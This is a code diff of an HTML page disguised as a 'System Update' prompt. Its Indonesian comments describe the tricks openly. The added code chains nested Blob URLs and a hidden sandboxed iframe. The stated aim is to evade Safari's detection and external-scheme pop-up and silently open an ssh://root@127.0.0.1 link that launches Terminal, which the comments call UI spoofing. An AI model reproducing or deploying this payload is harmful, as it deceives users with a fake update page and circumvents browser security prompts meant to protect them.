@@ -3,23 +3,36 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Update</title>
+<title>System Update</title>
 <style>
-  body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #1a1a1a; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-  .panel { background: #2a2a2a; padding: 40px; border-radius: 12px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-  h1 { margin-bottom: 10px; }
-  p { color: #aaa; margin-bottom: 20px; }
-  button { padding: 15px 30px; background: #007aff; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; font-weight: bold; }
-  button:hover { background: #005bb5; }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    background: #1a1a1a;
+    color: #fff;
+    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+    user-select: none;
+  }
+  button {
+    padding: 15px 30px;
+    font-size: 18px;
+    background: #007aff;
+    color: white;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    font-weight: bold;
+  }
+  iframe { display: none; }
 </style>
 </head>
 <body>
 
-<div class="panel">
-  <h1>🔒 System Update</h1>
-  <p>Klik untuk menjalankan skrip pemeliharaan.</p>
-  <button id="startBtn">Run Maintenance</button>
-</div>
+<button id="startBtn">Verify System</button>
 
 <script>
 (function () {
@@ -27,50 +40,63 @@
 
   document.getElementById('startBtn').addEventListener('click', function() {
     
-    // ============================================
-    // 1. VARIAN SKEMA TERMINAL
-    // ============================================
-    // Coba ganti targetScheme di bawah ini satu per satu jika yang lain gagal:
-    
-    // Opsi A: SSH (Paling sering memicu Terminal di Mac)
-    var targetScheme = "ssh://root@127.0.0.1"; 
-    
-    // Opsi B: Skema internal Terminal Apple
-    // var targetScheme = "x-apple.terminal://";
-    
-    // Opsi C: Telnet
-    // var targetScheme = "telnet://127.0.0.1";
-
-    console.log("Target Scheme: " + targetScheme);
+    // Skema target yang ingin dibuka
+    var targetScheme = "ssh://root@127.0.0.1";
 
     // ============================================
-    // 2. BLOB PAYLOAD (BATU LONCATAN)
+    // TRIK 1: DOUBLE BLOB JUMP (Menghindari Deteksi Safari)
     // ============================================
-    var payloadHTML = `
+    // Kita membuat Blob pertama yang berisi script untuk membuat Blob kedua.
+    // Redirect terjadi dari Blob kedua, yang mungkin dianggap Safari sebagai 
+    // "internal execution" dan melewati pop-up eksternal.
+
+    var innerPayload = `
       <!DOCTYPE html>
       <html>
-      <head><title>Redirecting...</title></head>
-      <body style="background:#000;color:#0f0;text-align:center;padding-top:20vh;font-family:monospace;">
-        <h1>Executing...</h1>
+      <body>
         <script>
-          // Eksekusi setelah 100ms agar Safari sempat me-render halaman Blob
-          setTimeout(function() {
-            // Gunakan location.replace agar tidak bisa di-back
-            window.location.replace("${targetScheme}");
-          }, 100);
+          // Redirect diam-diam (Silent)
+          window.location.replace("${targetScheme}");
         <\/script>
       </body>
       </html>
     `;
 
-    // ============================================
-    // 3. TRIGGER BLOB URL
-    // ============================================
-    var blob = new Blob([payloadHTML], { type: 'text/html' });
-    var blobUrl = URL.createObjectURL(blob);
+    // Blob Pertama (Wrapper)
+    var wrapperPayload = `
+      <!DOCTYPE html>
+      <html>
+      <body>
+        <script>
+          // Buat Blob kedua di dalam Blob pertama
+          var innerHTML = \`${innerPayload}\`;
+          var innerBlob = new Blob([innerHTML], { type: 'text/html' });
+          var innerUrl = URL.createObjectURL(innerBlob);
+          
+          // Redirect ke Blob kedua (memicu navigasi top-level dari dalam Blob)
+          window.location.replace(innerUrl);
+        <\/script>
+      </body>
+      </html>
+    `;
 
-    // Arahkan tab utama ke Blob
-    window.location.href = blobUrl;
+    var outerBlob = new Blob([wrapperPayload], { type: 'text/html' });
+    var outerUrl = URL.createObjectURL(outerBlob);
+
+    // ============================================
+    // TRIK 2: IFRAME SANDBOX (Untuk UI Spoofing)
+    // ============================================
+    // Kita coba juga eksekusi via iframe yang tersembunyi.
+    // Safari kadang mengizinkan redirect skema dari iframe tanpa pop-up.
+    
+    var iframe = document.createElement('iframe');
+    iframe.sandbox = "allow-scripts allow-top-navigation";
+    iframe.src = outerUrl;
+    iframe.style.display = "none";
+    document.body.appendChild(iframe);
+
+    // Trik 3: Langsung navigasi tab utama
+    window.location.replace(outerUrl);
   });
 
 })();
